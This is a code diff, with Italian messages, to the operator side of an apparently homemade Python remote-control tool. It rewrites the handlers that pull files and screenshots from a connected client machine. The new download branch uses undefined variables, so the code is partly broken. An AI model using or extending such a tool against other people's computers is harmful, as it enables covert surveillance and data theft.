@@ -215,38 +215,6 @@ def remoteControl(clientConnection,buff):
                 else:
                     print("\nError, incorrect command")
 
-            elif comando[0:8] == "download":
-                try:
-                    file = open(comando[10:len(comando) - 1], 'wb')
-                    filesize = clientConnection.recv(1024).decode(FORMAT)
-
-                    if filesize[0:7]!="[ERROR]":
-                        for i in tqdm(range(20), desc= Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                            sleep(0.2)
-
-                        scritti=file.write(clientConnection.recv(int(filesize)))
-                        file.close()
-
-                        if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
-                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
-                            print("Download fallito\n")
-                            os.remove(file)
-                        elif scritti < int(filesize):
-                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
-                            print("Download fallito\n")
-                            os.remove(file)
-                        else:
-                            fileLog = fileLog + "\n" + f"File scaricato correttamente\n" + "\n"
-                            print(f"File scaricato correttamente\n")
-
-                        time.sleep(2)
-                    else:
-                        raise Exception
-                except:
-                    traceback.print_exc()
-                    print("Download fallito\n")
-                    fileLog = fileLog + "\n" + "Download fallito\n"
-
             elif comando == "pwd":
                 pwdresult = clientConnection.recv(1024).decode(FORMAT)
                 print("\"" + pwdresult + "\"")
@@ -296,30 +264,86 @@ def remoteControl(clientConnection,buff):
                 print(output)
                 fileLog = fileLog + "\n" + output + "\n"
 
+            elif comando[0:8] == "download":
+                try:
+                    file = open(comando[10:len(comando) - 1], 'wb')
+                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + "Scaricamento file.png...", colour="green",
+                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
+
+                    filerecv = clientConnection.recv(1024)
+                    print(filerecv)
+                    try:
+                        fileIf = filerecv.decode(FORMAT)
+                    except:
+                        fileIf = ""
+
+                    if filesize[0:7]!="[ERROR]":
+
+                        scritti = 0
+                        while (filerecv):
+                            scritti = scritti + file.write(filerecv)
+                            filerecv = clientConnection.recv(1024)
+                            if filerecv == b'[END]':
+                                filerecv = ''
+
+                        file.close()
+
+                        if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
+                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
+                            print("Download fallito\n")
+                            os.remove(file)
+                        elif scritti < os.path.getsize(nomeFoto):
+                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
+                            print("Download fallito\n")
+                            os.remove(file)
+                        else:
+                            fileLog = fileLog + "\n" + f"File scaricato correttamente\n" + "\n"
+                            print(f"File scaricato correttamente\n")
+                        time.sleep(2)
+                    else:
+                        raise Exception
+                except:
+                    traceback.print_exc()
+                    print("Download fallito\n")
+                    fileLog = fileLog + "\n" + "Download fallito\n"
+
             elif comando == "screenshot":
-                nomeFoto = input("Inserire nome foto (.png/.jpeg): ")
+                nomeFoto = input("Inserire nome foto: ")
+                nomeFoto=nomeFoto+".png"
                 fileLog = fileLog + "\n" + "Inserire nome foto: " + nomeFoto + "\n"
 
                 try:
                     file = open(nomeFoto, 'wb')
-                    filesize=clientConnection.recv(1024).decode(FORMAT)
-                    print(filesize)
+                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + "Scaricamento file.png...", colour="green",
+                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
 
-                    if filesize[0:7] != "[ERROR]":
-                        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                            sleep(0.2)
+                    filerecv=clientConnection.recv(1024)
+                    print(filerecv)
+                    try:
+                        fileIf=filerecv.decode(FORMAT)
+                    except:
+                        fileIf=""
 
-                        scritti = file.write(clientConnection.recv(int(filesize)))
+                    if fileIf[0:7] != "[ERROR]":
+                        scritti=0
+                        while(filerecv):
+                            scritti = scritti + file.write(filerecv)
+                            filerecv = clientConnection.recv(1024)
+                            if filerecv == b'[END]':
+                                filerecv=''
+
                         file.close()
 
                         if os.path.getsize(nomeFoto) <= 0:
                             fileLog = fileLog + "\n" + "Screenshot fallito\n" + "\n"
                             print("Screenshot fallito\n")
-                            os.remove(file)
-                        elif scritti < int(filesize):
+                            os.remove(nomeFoto)
+                        elif scritti < os.path.getsize(nomeFoto):
                             fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
                             print("Download fallito\n")
-                            os.remove(file)
+                            os.remove(nomeFoto)
                         else:
                             fileLog = fileLog + "\n" + f"Screenshot scaricato correttamente\n" + "\n"
                             print(f"Screenshot scaricato correttamente\n")
